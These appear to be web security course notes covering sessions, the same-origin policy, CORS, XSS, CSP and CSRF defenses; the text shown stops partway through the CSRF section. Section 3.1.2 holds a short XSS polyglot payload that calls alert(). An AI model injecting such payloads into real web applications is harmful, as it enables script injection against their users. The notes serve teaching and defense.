<!doctype html>
<html lang="en">
<head>
<title>Web Security</title>
<!-- 2024-05-21 Tue 17:22 -->
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="generator" content="Org-mode">
<meta name="author" content="Pietro Visconti">

<link  href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.5/js/bootstrap.min.js"></script>
<style>
/* org mode styles on top of twbs */

html {
    position: relative;
    min-height: 100%;
}

body {
    font-size: 18px;
    margin-bottom: 105px;
}

footer {
    position: absolute;
    bottom: 0;
    width: 100%;
    height: 101px;
    background-color: #f5f5f5;
}

footer > div {
    padding: 10px;
}

footer p {
    margin: 0 0 5px;
    text-align: center;
    font-size: 16px;
}

#table-of-contents {
    margin-top: 20px;
    margin-bottom: 20px;
}

blockquote p {
    font-size: 18px;
}

pre {
    font-size: 16px;
}

.footpara {
    display: inline-block;
}

figcaption {
  font-size: 16px;
  color: #666;
  font-style: italic;
  padding-bottom: 15px;
}

/* from twbs docs */

.bs-docs-sidebar.affix {
    position: static;
}
@media (min-width: 768px) {
    .bs-docs-sidebar {
        padding-left: 20px;
    }
}

/* All levels of nav */
.bs-docs-sidebar .nav > li > a {
    display: block;
    padding: 4px 20px;
    font-size: 14px;
    font-weight: 500;
    color: #999;
}
.bs-docs-sidebar .nav > li > a:hover,
.bs-docs-sidebar .nav > li > a:focus {
    padding-left: 19px;
    color: #A1283B;
    text-decoration: none;
    background-color: transparent;
    border-left: 1px solid #A1283B;
}
.bs-docs-sidebar .nav > .active > a,
.bs-docs-sidebar .nav > .active:hover > a,
.bs-docs-sidebar .nav > .active:focus > a {
    padding-left: 18px;
    font-weight: bold;
    color: #A1283B;
    background-color: transparent;
    border-left: 2px solid #A1283B;
}

/* Nav: second level (shown on .active) */
.bs-docs-sidebar .nav .nav {
    display: none; /* Hide by default, but at >768px, show it */
    padding-bottom: 10px;
}
.bs-docs-sidebar .nav .nav > li > a {
    padding-top: 1px;
    padding-bottom: 1px;
    padding-left: 30px;
    font-size: 12px;
    font-weight: normal;
}
.bs-docs-sidebar .nav .nav > li > a:hover,
.bs-docs-sidebar .nav .nav > li > a:focus {
    padding-left: 29px;
}
.bs-docs-sidebar .nav .nav > .active > a,
.bs-docs-sidebar .nav .nav > .active:hover > a,
.bs-docs-sidebar .nav .nav > .active:focus > a {
    padding-left: 28px;
    font-weight: 500;
}

/* Nav: third level (shown on .active) */
.bs-docs-sidebar .nav .nav .nav {
    padding-bottom: 10px;
}
.bs-docs-sidebar .nav .nav .nav > li > a {
    padding-top: 1px;
    padding-bottom: 1px;
    padding-left: 40px;
    font-size: 12px;
    font-weight: normal;
}
.bs-docs-sidebar .nav .nav .nav > li > a:hover,
.bs-docs-sidebar .nav .nav .nav > li > a:focus {
    padding-left: 39px;
}
.bs-docs-sidebar .nav .nav .nav > .active > a,
.bs-docs-sidebar .nav .nav .nav > .active:hover > a,
.bs-docs-sidebar .nav .nav .nav > .active:focus > a {
    padding-left: 38px;
    font-weight: 500;
}

/* Show and affix the side nav when space allows it */
@media (min-width: 992px) {
    .bs-docs-sidebar .nav > .active > ul {
        display: block;
    }
    /* Widen the fixed sidebar */
    .bs-docs-sidebar.affix,
    .bs-docs-sidebar.affix-bottom {
        width: 213px;
    }
    .bs-docs-sidebar.affix {
        position: fixed; /* Undo the static from mobile first approach */
        top: 20px;
    }
    .bs-docs-sidebar.affix-bottom {
        position: absolute; /* Undo the static from mobile first approach */
    }
    .bs-docs-sidebar.affix .bs-docs-sidenav,.bs-docs-sidebar.affix-bottom .bs-docs-sidenav {
        margin-top: 0;
        margin-bottom: 0
    }
}
@media (min-width: 1200px) {
    /* Widen the fixed sidebar again */
    .bs-docs-sidebar.affix-bottom,
    .bs-docs-sidebar.affix {
        width: 263px;
    }
}
</style>
<script>
$(function() {
    'use strict';

    $('.bs-docs-sidebar li').first().addClass('active');

    $(document.body).scrollspy({target: '.bs-docs-sidebar'});

    $('.bs-docs-sidebar').affix();
});
</script>

<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  displayAlign: "center",
  displayIndent: "2em",
  messageStyle: "none",
  "HTML-CSS": {
    scale: 100,
    styles: {
      ".MathJax_Display": {
        "font-size": "100%"
      }
    }
  },
  "SVG": {
    scale: 100,
    styles: {
      ".MathJax_SVG_Display": {
        "font-size": "100%",
        "margin-left": "-2.281em"
      }
    }
  }
});
</script>
<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_SVG"></script>
</head>
<body>
<div id="content" class="container">
<div class="row"><div class="col-md-3 col-md-push-9"><nav id="table-of-contents">
<div id="text-table-of-contents" class="bs-docs-sidebar">
<ul class="nav">
<li><a href="#sec-1">1. Web Sessions Security</a>
<ul class="nav">
<li><a href="#sec-1-1">1.1. Session Management</a></li>
<li><a href="#sec-1-2">1.2. Attacks on sessions integrity</a></li>
<li><a href="#sec-1-3">1.3. Session expiration</a></li>
</ul>
</li>
<li><a href="#sec-2">2. Same Origin Policy (SOP)</a>
<ul class="nav">
<li><a href="#sec-2-1">2.1. Web Origins</a></li>
<li><a href="#sec-2-2">2.2. Cookies VS Web Storage</a></li>
<li><a href="#sec-2-3">2.3. SOP and content inclusion</a></li>
<li><a href="#sec-2-4">2.4. Cross-Origin-Resource-Sharing (CORS)</a></li>
</ul>
</li>
<li><a href="#sec-3">3. Cross-site scripting (XSS)</a>
<ul class="nav">
<li><a href="#sec-3-1">3.1. XSS Categories</a></li>
<li><a href="#sec-3-2">3.2. XSS defenses</a></li>
</ul>
</li>
<li><a href="#sec-4">4. Content Security Policy (CSP)</a>
<ul class="nav">
<li><a href="#sec-4-1">4.1. CSP directives</a></li>
<li><a href="#sec-4-2">4.2. CSP default restrictions (script-src, default-src)</a></li>
<li><a href="#sec-4-3">4.3. CSP Roadblocks</a></li>
<li><a href="#sec-4-4">4.4. CSP Nonces</a></li>
<li><a href="#sec-4-5">4.5. Supporting dynamic scripts</a></li>
<li><a href="#sec-4-6">4.6. Summary: How to configure CSP?</a></li>
</ul>
</li>
<li><a href="#sec-5">5. Cross-site request forgery</a>
<ul class="nav">
<li><a href="#sec-5-1">5.1. How to prevent CSRF?</a></li>
<li><a href="#sec-5-2">5.2. Double Sumbit</a></li>
<li><a href="#sec-5-3">5.3. SameSite Cookies</a></li>
<li><a href="#sec-5-4">5.4. Vulnerability: Login CSRF</a></li>
<li><a href="#sec-5-5">5.5. CSRF prevention: summary</a></li>
<li><a href="#sec-5-6">5.6. XSS vs CSRF</a></li>
</ul>
</li>
<li><a href="#sec-6">6. Frames Security</a>
<ul class="nav">
<li><a href="#sec-6-1">6.1. Domain relaxation</a></li>
<li><a href="#sec-6-2">6.2. postMessage</a></li>
<li><a href="#sec-6-3">6.3. Frame sandboxing</a></li>
<li><a href="#sec-6-4">6.4. Clickjacking</a></li>
<li><a href="#sec-6-5">6.5. CSP vs XFO</a></li>
<li><a href="#sec-6-6">6.6. SameSite Cookies and Clickjacking</a></li>
</ul>
</li>
<li><a href="#sec-7">7. HTTP &amp; TLS</a>
<ul class="nav">
<li><a href="#sec-7-1">7.1. TLS</a></li>
<li><a href="#sec-7-2">7.2. Protocol downgrade attacks</a></li>
<li><a href="#sec-7-3">7.3. Heartbleed</a></li>
<li><a href="#sec-7-4">7.4. Certificates</a></li>
</ul>
</li>
<li><a href="#sec-8">8. More HTTPS</a>
<ul class="nav">
<li><a href="#sec-8-1">8.1. Mixed Content Policy</a></li>
<li><a href="#sec-8-2">8.2. CSP to TLS enforcement</a></li>
<li><a href="#sec-8-3">8.3. HTTP Strict Transport Security (HSTS)</a></li>
</ul>
</li>
<li><a href="#sec-9">9. Server-side security</a>
<ul class="nav">
<li><a href="#sec-9-1">9.1. Path traversal</a></li>
<li><a href="#sec-9-2">9.2. Command injection</a></li>
<li><a href="#sec-9-3">9.3. Templates</a></li>
<li><a href="#sec-9-4">9.4. Insecure deserialization</a></li>
<li><a href="#sec-9-5">9.5. File inclusion</a></li>
<li><a href="#sec-9-6">9.6. Unrestricted File Upload</a></li>
<li><a href="#sec-9-7">9.7. Server-side request forgery</a></li>
<li><a href="#sec-9-8">9.8. Open redirect</a></li>
<li><a href="#sec-9-9">9.9. XML external entities</a></li>
<li><a href="#sec-9-10">9.10. HTTP Parameter pollution</a></li>
</ul>
</li>
</ul>
</div>
</nav>
</div><div class="col-md-9 col-md-pull-3"><h1 class="title">Web Security</h1>
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><span class="section-number-2">1</span> Web Sessions Security</h2>
<div class="outline-text-2" id="text-1">
</div><div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1"><span class="section-number-3">1.1</span> Session Management</h3>
<div class="outline-text-3" id="text-1-1">
<ol class="org-ol">
<li><b>Server-side state</b>: Persist the state information on the server, e.g., in a
database, and use the cookie just to store a session identifier. The database
storing session information can become a bottleneck.
</li>
<li><b>Client-side state</b>: Persist the state information directly into the cookie.
A secure implementation requires the use of cryptography, at least for
signing the cookie and possibly for encrypting it.
</li>
</ol>
</div>
</div>
<div id="outline-container-sec-1-2" class="outline-3">
<h3 id="sec-1-2"><span class="section-number-3">1.2</span> Attacks on sessions integrity</h3>
<div class="outline-text-3" id="text-1-2">
</div><div id="outline-container-sec-1-2-1" class="outline-4">
<h4 id="sec-1-2-1"><span class="section-number-4">1.2.1</span> Session hijacking</h4>
<div class="outline-text-4" id="text-1-2-1">
<p>
An attacker who gets access to a honest user’s cookies can impersonate her by
presenting such cookies: this attack is known as session hijacking.
</p>

<blockquote>
<p>
<b>HTTP only cookie</b>: Cookies marked with the HttpOnly attribute are not
 accessible to JS, thus offering confidentiality against web attackers.
</p>
</blockquote>

<blockquote>
<p>
<b>Secure cookies</b>: Cookies marked with the Secure attribute are only sent over
 HTTPS and made inaccessible to JavaScript running in HTTP pages. The Secure
 attribute should be used even when the web application is entirely deployed
 over HTTPS.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-sec-1-2-2" class="outline-4">
<h4 id="sec-1-2-2"><span class="section-number-4">1.2.2</span> Session fixation</h4>
<div class="outline-text-4" id="text-1-2-2">
<p>
Many web applications use <b>pre-sessions</b> (unauthenticated sessions) to keep
track of state information even before login. For example, Most e-commerce
applications allow users to add items to their shopping cart before login for
usability reasons. The content of the cart is persisted upon login to enable
payments. <b>Cookies storing session identifiers should be refreshed every time
the privilege level of the session changes, e.g., upon login</b>. Otherwise, the
web application might be vulnerable to <b>session fixation</b>.
</p>

<blockquote>
<p>
<b>Session fixation through cookie</b>: This method explores the server response to
 fix the Session ID in the victim’s browser. Including the parameter Set-Cookie
 in the HTTP header response, the attacker is able to insert the value of
 Session ID in the cookie and sends it to the victim’s browser.
</p>
</blockquote>
</div>
<ol class="org-ol"><li><a id="sec-1-2-2-1" name="sec-1-2-2-1"></a>Preventing Session fixation<br ><div class="outline-text-5" id="text-1-2-2-1">
<ol class="org-ol">
<li><b>Refresh cookies upon authentication</b>: when the credentials are verified,
change the value of the cookie and start a new session;
</li>
<li><b>Enforce cookie integrity</b>: ensure that the attacker cannot set cookies for
the target web application
</li>
</ol>
</div>
</li></ol>
</div>
<div id="outline-container-sec-1-2-3" class="outline-4">
<h4 id="sec-1-2-3"><span class="section-number-4">1.2.3</span> Cross-Site-Request-Forgery</h4>
<div class="outline-text-4" id="text-1-2-3">
<p>
Since cookies are automatically attached to HTTP requests by default, an
attacker can <b>force the creation of authenticated requests from the victim’s
browser</b>, which might trigger security-sensitive actions (CSRF).
</p>

<p>
Discussed below in detail.
</p>
</div>
</div>
<div id="outline-container-sec-1-2-4" class="outline-4">
<h4 id="sec-1-2-4"><span class="section-number-4">1.2.4</span> Cookie forcing</h4>
<div class="outline-text-4" id="text-1-2-4">
<p>
Cookie forcing is not necessarily dangerous, but can be nasty. <b>Example</b>: Since
paypal.com binds a credit card number to a personal account, an attacker can
perform cookie forcing on paypal.com to eventually <b>get access to the credit
card</b> number of the victim.
</p>
</div>
</div>
</div>
<div id="outline-container-sec-1-3" class="outline-3">
<h3 id="sec-1-3"><span class="section-number-3">1.3</span> Session expiration</h3>
<div class="outline-text-3" id="text-1-3">
<p>
Cookies are deleted by default when the web browser is closed, but web
applications can modify this through the <b>Expires</b> attribute:
</p>
<ul class="org-ul">
<li><b>long session lifetimes</b> improve usability, but might harm security;
</li>
<li>make the <b>“Remember Me”</b> functionality an opt-in.
</li>
</ul>

<p>
<b>Implementation</b>:
</p>
<ul class="org-ul">
<li><b>Server-Side State</b>: Expiration is simple to implement: just invalidate the
session identifier by deleting the corresponding entries from the database.
</li>
<li><b>Client-Side State</b>: Include an expiration date as part of the encrypted data
and implement a blacklist of session cookies issued to compromised accounts.
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2"><span class="section-number-2">2</span> Same Origin Policy (SOP)</h2>
<div class="outline-text-2" id="text-2">
<p>
The Same Origin Policy (SOP) is the baseline defense mechanism of web browsers,
which isolates data controlled by good.com from read / write accesses by scripts
served from evil.com.
</p>
</div>
<div id="outline-container-sec-2-1" class="outline-3">
<h3 id="sec-2-1"><span class="section-number-3">2.1</span> Web Origins</h3>
<div class="outline-text-3" id="text-2-1">
<p>
SOP defines its own isolation domains in terms of origins.
</p>

<blockquote>
<p>
<b>Origin</b>: An origin is a triple including a scheme, a hostname and a port. When
 the port is omitted, the default port of the scheme is implicitly assumed.
</p>
</blockquote>

<blockquote>
<p>
<b>SOP restrictions</b>: At a high level, SOP can be summarized as follows: data
 owned by origin \(o_{1}\) must be isolated from read / write accesses by any
 origin \(o_{2} \neq o_{1}\).
</p>
</blockquote>
</div>
</div>
<div id="outline-container-sec-2-2" class="outline-3">
<h3 id="sec-2-2"><span class="section-number-3">2.2</span> Cookies VS Web Storage</h3>
<div class="outline-text-3" id="text-2-2">
<table class="table table-striped table-bordered table-hover table-condensed">


<colgroup>
<col  class="left">

<col  class="left">
</colgroup>
<tbody>
<tr>
<td class="text-left">Cookies</td>
<td class="text-left">Web Storage</td>
</tr>

<tr>
<td class="text-left">- Relaxed SOP (insicure)</td>
<td class="text-left">+ Traditional SOP (more secure)</td>
</tr>

<tr>
<td class="text-left">- Sent automatically (CSRF)</td>
<td class="text-left">+ Sent on demand (no CSRF)</td>
</tr>

<tr>
<td class="text-left">+ HttpOnly: shielded from JS</td>
<td class="text-left">- Always accessible to JS (risky)</td>
</tr>

<tr>
<td class="text-left">+ Sessions are easy to implement</td>
<td class="text-left">- Sessions require custom JS logic</td>
</tr>
</tbody>
</table>

<p>
<b>Cookies + Web Storage = Better sessions</b> against the Session hijacking, session
fixation, CSRF.
</p>
</div>
</div>
<div id="outline-container-sec-2-3" class="outline-3">
<h3 id="sec-2-3"><span class="section-number-3">2.3</span> SOP and content inclusion</h3>
<div class="outline-text-3" id="text-2-3">
<p>
Since the Web is designed to be interconnected, <b>SOP puts very little
restrictions</b> on content inclusion. For example, foo.com can normally load
images and stylesheets from bar.com.
</p>

<blockquote>
<p>
<b>Sub-Resource Integrity</b>: It is possible to enforce integrity checks on included
 scripts, browsers fetching the remote script compare the hash in the integrity
 tag with the hash computed from the downloaded script; if the two hashes do not
 match, the script is not loaded. <b>Difficult to deploy</b>.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-sec-2-4" class="outline-3">
<h3 id="sec-2-4"><span class="section-number-3">2.4</span> Cross-Origin-Resource-Sharing (CORS)</h3>
<div class="outline-text-3" id="text-2-4">
<p>
CORS provides a disciplined way to relax the restrictions of SOP:
</p>
<ol class="org-ol">
<li>foo.com asks for permission to read cross-origin data;
</li>
<li>bar.com grants or denies such permission;
</li>
<li>the browser enforces the authorization decision at foo.com;
</li>
</ol>

<blockquote>
<p>
<b>CORS headers</b>:
</p>
<ul class="org-ul">
<li><b>Origin</b>: request header containing the origin which is asking for
cross-origin read permission;
</li>
<li><b>Access-Control-Allow-Origin</b>: response header containing the origin to which
such permission is granted (* for any origin).

<p>
Access is granted iff the content of the Access-Control-Allow-Origin header
matches the content of the Origin header.
</p>
</li>
</ul>
</blockquote>
</div>
<div id="outline-container-sec-2-4-1" class="outline-4">
<h4 id="sec-2-4-1"><span class="section-number-4">2.4.1</span> CORS: Non-Simple Requests</h4>
<div class="outline-text-4" id="text-2-4-1">
<blockquote>
<p>
<b>CORS headers</b>:
</p>
<ul class="org-ul">
<li><b>Access-Control-Request-Method</b>: preflight request header containing the
method of the non-simple request;
</li>
<li><b>Access-Control-Request-Headers</b>: preflight request header containing the list
of the custom headers of the non-simple request;
</li>
<li><b>Access-Control-Allow-Methods</b>: preflight response header containing a list of
allowed methods;
</li>
<li><b>Access-Control-Allow-Headers</b>: preflight response header containing a list of
allowed custom headers;
</li>
<li><b>Access-Control-Max-Age</b>: preflight response header for caching.
</li>
</ul>
</blockquote>
</div>
</div>
<div id="outline-container-sec-2-4-2" class="outline-4">
<h4 id="sec-2-4-2"><span class="section-number-4">2.4.2</span> Security of CORS</h4>
<div class="outline-text-4" id="text-2-4-2">
<p>
CORS is a standardized, more secure alternative to JSONP:
</p>
<ol class="org-ol">
<li><b>No script injection</b>: though the callee can still respond with arbitrary
content, the caller can process the response (not a script) before actually
using it. This is normally done in the XHR callback.
</li>
<li><b>No information leakage</b>: only credentialed requests might disclose
confidential information and the callee has control over them, thanks to the
Access-Control-Allow-Origin header.
</li>
</ol>
</div>
</div>
</div>
</div>
<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3"><span class="section-number-2">3</span> Cross-site scripting (XSS)</h2>
<div class="outline-text-2" id="text-3">
<p>
Cross Site Scripting (XSS) is the king of client-side attacks, because it allows
the attacker to inject scripts on a vulnerable web application: when a malicious
script runs in the target’s origin, <b>SOP is ineffective</b>.
</p>

<p>
<b>XSS flow</b>:
</p>
<ol class="org-ol">
<li>the attacker identifies a part of the target web application which processes
<b>untrusted input from the user</b>, e.g., a search field;
</li>
<li>the attacker discovers that the supplied <b>input can be eventually interpreted
as a script</b>, e.g., using their own browser;
</li>
<li>the attacker sends a maliciously crafted link to the victim, who accesses it
and triggers a script injection;
</li>
<li>since the script actually comes from the target web application, it runs <b>in
the same origin of the target</b>.
</li>
</ol>
</div>
<div id="outline-container-sec-3-1" class="outline-3">
<h3 id="sec-3-1"><span class="section-number-3">3.1</span> XSS Categories</h3>
<div class="outline-text-3" id="text-3-1">
<blockquote>
<p>
<b>Type flow</b>:
</p>
<ul class="org-ul">
<li><b>Reflected XSS</b>: happens when web applications echo back untrusted user input
to the client.
</li>
<li><b>Persistent XSS</b>: happens when web applications store untrusted user input
somewhere and automatically echo it back later.
</li>
</ul>
</blockquote>

<blockquote>
<p>
<b>Location of flow</b>:
</p>
<ul class="org-ul">
<li><b>Server-side XSS</b>: vulnerable code on the server (“traditional” XSS)
</li>
<li><b>Client-side XSS</b>: vulnerable code on the client (DOM-based XSS)
</li>
</ul>
</blockquote>
</div>
<div id="outline-container-sec-3-1-1" class="outline-4">
<h4 id="sec-3-1-1"><span class="section-number-4">3.1.1</span> Categories summary</h4>
<div class="outline-text-4" id="text-3-1-1">
<table class="table table-striped table-bordered table-hover table-condensed">


<colgroup>
<col  class="left">

<col  class="left">

<col  class="left">

<col  class="left">
</colgroup>
<tbody>
<tr>
<td class="text-left"><b>Reflected server-side XSS</b></td>
<td class="text-left"><b>Reflected client-side XSS</b></td>
<td class="text-left"><b>Persistent server-side XSS</b></td>
<td class="text-left"><b>Persistent client-side</b> XSS</td>
</tr>

<tr>
<td class="text-left">User must visit malicious link</td>
<td class="text-left">User must visit malicious link</td>
<td class="text-left">Attacker can store malicious payload on server</td>
<td class="text-left">User must visit malicious link, but just once</td>
</tr>

<tr>
<td class="text-left">No persistent change to the server (one attack per visit)</td>
<td class="text-left">No persistent change to the client (one attack per visit)</td>
<td class="text-left">Every user of the site affected on every visit</td>
<td class="text-left">Single user of the site affected on every visit</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="outline-container-sec-3-1-2" class="outline-4">
<h4 id="sec-3-1-2"><span class="section-number-4">3.1.2</span> XSS Polyglot</h4>
<div class="outline-text-4" id="text-3-1-2">
<p>
A polyglot is an exploit working in several different contexts:
</p>
<div class="org-src-container">

<pre class="src src-javascript">javascript:alert()<span style="color: #928374;">//</span><span style="color: #928374;">"){}alert();//&lt;/a&gt;&lt;script&gt;alert()&lt;/script&gt;</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-sec-3-2" class="outline-3">
<h3 id="sec-3-2"><span class="section-number-3">3.2</span> XSS defenses</h3>
<div class="outline-text-3" id="text-3-2">
<table class="table table-striped table-bordered table-hover table-condensed">


<colgroup>
<col  class="left">

<col  class="left">
</colgroup>
<tbody>
<tr>
<td class="text-left"><b>Output encoding</b></td>
<td class="text-left"><b>Input Sanitization</b></td>
</tr>

<tr>
<td class="text-left">Very easy to use</td>
<td class="text-left">Don’t do it by yourself!</td>
</tr>

<tr>
<td class="text-left">Solves the root cause of the security vulnerability</td>
<td class="text-left">Some attacks like markup injection might still be there</td>
</tr>

<tr>
<td class="text-left">Sometimes restrictive</td>
<td class="text-left">Sometimes necessary</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4"><span class="section-number-2">4</span> Content Security Policy (CSP)</h2>
<div class="outline-text-2" id="text-4">
<p>
CSP was born as an industrial effort to design a <b>declarative client-side
defense</b> mechanism <b>against XSS</b> in 2010:
</p>
<ul class="org-ul">
<li>Now supported by all major web browsers;
</li>
<li>Useful defense-in-depth (<b>mitigation</b>) approach against XSS: it does not
substitute input sanitization and output encoding;
</li>
<li>No protection against scriptless attacks like HTML markup injection.
</li>
</ul>

<p>
A CSP is a <b>page-level security policy</b> delivered to the browser via the
<b>Content-Security-Policy</b> header. The browser then takes care of enforcing the
policy on the page.
</p>
</div>
<div id="outline-container-sec-4-1" class="outline-3">
<h3 id="sec-4-1"><span class="section-number-3">4.1</span> CSP directives</h3>
<div class="outline-text-3" id="text-4-1">
<table class="table table-striped table-bordered table-hover table-condensed">


<colgroup>
<col  class="left">

<col  class="left">
</colgroup>
<tbody>
<tr>
<td class="text-left"><b>Directive</b></td>
<td class="text-left"><b>Applies to</b></td>
</tr>

<tr>
<td class="text-left">connect-src</td>
<td class="text-left">Targets of XHRs</td>
</tr>

<tr>
<td class="text-left">img-src</td>
<td class="text-left">Images and favicons</td>
</tr>

<tr>
<td class="text-left">object-src</td>
<td class="text-left">Plugins (Flash, applets&#x2026;)</td>
</tr>

<tr>
<td class="text-left">script-src</td>
<td class="text-left">JavaScript files</td>
</tr>

<tr>
<td class="text-left">style-src</td>
<td class="text-left">CSS files</td>
</tr>

<tr>
<td class="text-left">default-src</td>
<td class="text-left">Fallback directive</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="outline-container-sec-4-2" class="outline-3">
<h3 id="sec-4-2"><span class="section-number-3">4.2</span> CSP default restrictions (script-src, default-src)</h3>
<div class="outline-text-3" id="text-4-2">
<p>
<b>Script execution</b>:
</p>
<ul class="org-ul">
<li>No execution of inline scripts;
</li>
<li>No execution of inline event handlers, e.g., onerror;
</li>
<li>No execution of javascript: URLs.
</li>
</ul>

<p>
<b>String-to-code transformation</b>:
</p>
<ul class="org-ul">
<li>Invocation of the eval function is forbidden;
</li>
<li>Functions like setTimeout must be invoked with a callable.
</li>
</ul>
</div>
</div>
<div id="outline-container-sec-4-3" class="outline-3">
<h3 id="sec-4-3"><span class="section-number-3">4.3</span> CSP Roadblocks</h3>
<div class="outline-text-3" id="text-4-3">
<ol class="org-ol">
<li><b>Whitelist</b>: The simplest way to build whitelists is to enforce a restrictive
CSP as report-only via the <b>Content-Security-Policy-Report-Only</b> header;
</li>
<li><b>Inline Scripts and Friends</b>: CSP forbids inline scripts, event handlers and
javascript, so one has to:
<ol class="org-ol">
<li>Move inline scripts to external files;
</li>
<li>Replace event handlers with listeners registered by external scripts;
</li>
<li>Replace javascript: URLs with script-initiated code.
</li>
</ol>
</li>
<li><b>String-to-Code Transformations</b>: Functions like eval and setTimeout can be
used to transform strings into code, thus leading to injections.
</li>
</ol>
</div>
</div>
<div id="outline-container-sec-4-4" class="outline-3">
<h3 id="sec-4-4"><span class="section-number-3">4.4</span> CSP Nonces</h3>
<div class="outline-text-3" id="text-4-4">
<p>
CSP can now be used to whitelist scripts (inline or external) bearing a <b>valid
nonce</b>, i.e., a random, unpredictable string:
</p>
<div class="org-src-container">

<pre class="src src-html">script-src &#8217;self&#8217; https://example.com &#8217;nonce-54321&#8217;; default-src &#8217;self&#8217;
</pre>
</div>

<p>
Individual inline scripts can be whitelisted using the nonce attribute (the same
nonce can be used for many inline scripts):
</p>
<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #b8bb26;">script</span> <span style="color: #83a598;">nonce</span>=<span style="color: #b8bb26;">"54321"</span>&gt; alert(1); &lt;/<span style="color: #b8bb26;">script</span>&gt;
</pre>
</div>

<p>
<b>Nonces advantages</b>:
</p>
<ul class="org-ul">
<li>They provide support for inline scripts, without falling back to the complete
absence of security of ’unsafe-inline’;
</li>
<li>They whitelist individual scripts as opposed to entire origins, which
simplifies the security auditing
</li>
</ul>

<blockquote>
<p>
The developer is in charge of generating random, unpredictable nonces on each
incoming request and populating the CSP header correctly: <b>Nonce reuse can
easily break protection against XSS</b>.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-sec-4-5" class="outline-3">
<h3 id="sec-4-5"><span class="section-number-3">4.5</span> Supporting dynamic scripts</h3>
<div class="outline-text-3" id="text-4-5">
<p>
Make use of the <b>’strict-dynamic’</b> keyword, which propagates trust from
nonce-authorized scripts to the new scripts they insert.
</p>

<p>
Or, <b>CSP hashes</b>: Hashes provide better security guarantees than nonces, because
they take the actual script code into account.
</p>
<div class="org-src-container">

<pre class="src src-html">script-src &#8217;sha512-YWIzOWNiNzJjNDRlY&#8217;;
</pre>
</div>
<p>
The following inline script will be executed, under the assumption that the
SHA-512 hash of its body is YWIzOWNiNzJjNDRlY:
</p>
<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #b8bb26;">script</span>&gt; alert(1); &lt;/<span style="color: #b8bb26;">script</span>&gt;
</pre>
</div>

<blockquote>
<p>
<b>’strict-dynamic’ also covers hash-authorized scripts</b>.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-sec-4-6" class="outline-3">
<h3 id="sec-4-6"><span class="section-number-3">4.6</span> Summary: How to configure CSP?</h3>
<div class="outline-text-3" id="text-4-6">
<ol class="org-ol">
<li><b>whitelist-based</b>: often <b>insecure</b>. Even assuming CSP best practices are
followed, it is basically impossible to vet entire origins;
</li>
<li><b>nonce-based</b>: <b>more secure, but no guarantees</b> about the executed script
content. Be aware of the dangers of ’strict-dynamic’;
</li>
<li><b>hash-based</b>: <b>complete control</b> of the executed scripts, including their
content, but often <b>too complicated to deploy</b> in practice.
</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5"><span class="section-number-2">5</span> Cross-site request forgery</h2>
<div class="outline-text-2" id="text-5">
<p>
CSRF is enabled by the attachment of session cookies to HTTP requests forged by
malicious pages.
</p>
</div>
<div id="outline-container-sec-5-1" class="outline-3">
<h3 id="sec-5-1"><span class="section-number-3">5.1</span> How to prevent CSRF?</h3>
<div class="outline-text-3" id="text-5-1">
<ul class="org-ul">
<li><b>Server-side fixes</b>: Do not authenticate requests based on cookies alone;
</li>
<li><b>Client-side fixes</b>: Change the way cookies work: modern browsers offer a
native protection mechanism via the <b>SameSite</b> cookie attribute.
</li>
</ul>

<blockquote>
<p>
<b>Referer checking</b>: A possible defense against CSRF is checking the content of
 the Referer header of security-sensitive HTTP requests. This header contains
 the full URL of the page which sent the request.
</p>
</blockquote>

<blockquote>
<p>
<b>Origin checking</b>: Rather than checking the value of the Referer header, one can
 check the value of the Origin header introduced for CORS:
</p>
<ul class="org-ul">
<li><b>privacy-friendly</b> version of Referer: it includes just the origin, not the
entire URL;
</li>
<li>always attached to XHR requests by default
</li>
<li>in modern browsers: also attached to cross-origin <b>POST requests</b>, e.g., upon
form submission
</li>
</ul>

<p>
In general, <b>Origin checking should be preferred over Referer checking</b>, but the
two mechanisms share similar limitations.
</p>
</blockquote>

<blockquote>
<p>
<b>Custom headers</b>: Another defense relies on custom headers, e.g., <b>CSRF-Protection: 1</b>. The presence of the header already suffices and its value is unimportant, since SOP prevents the use of custom headers on cross-origin requests.
</p>
</blockquote>

<blockquote>
<p>
<b>Secret tokens</b>: The most common defense against CSRF deployed in the wild is the inclusion of secret tokens as part of security-sensitive requests. The expected value of the secret token is typically stored in the user’s session at the server side: only requests bearing a valid token are processed by the web application.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-sec-5-2" class="outline-3">
<h3 id="sec-5-2"><span class="section-number-3">5.2</span> Double Sumbit</h3>
<div class="outline-text-3" id="text-5-2">
<p>
The <b>double submit pattern</b> is a popular approach to the use of tokens:
</p>
<ul class="org-ul">
<li>the token is still embedded as a parameter of each sensitive HTTP request, as
in the previous example, <b>but the right value of the token is stored inside a
  cookie</b> (rather than in the session);
</li>
<li>Every time a sensitive HTTP request is received, <b>the server checks that the
value of the cookie matches the value of the parameter</b>;
</li>
<li>As before: the attacker cannot craft a request with the right value of the parameter (unless they know the value of the cookie).
</li>
</ul>
</div>
<div id="outline-container-sec-5-2-1" class="outline-4">
<h4 id="sec-5-2-1"><span class="section-number-4">5.2.1</span> Double Submit: Cookie confidentiality</h4>
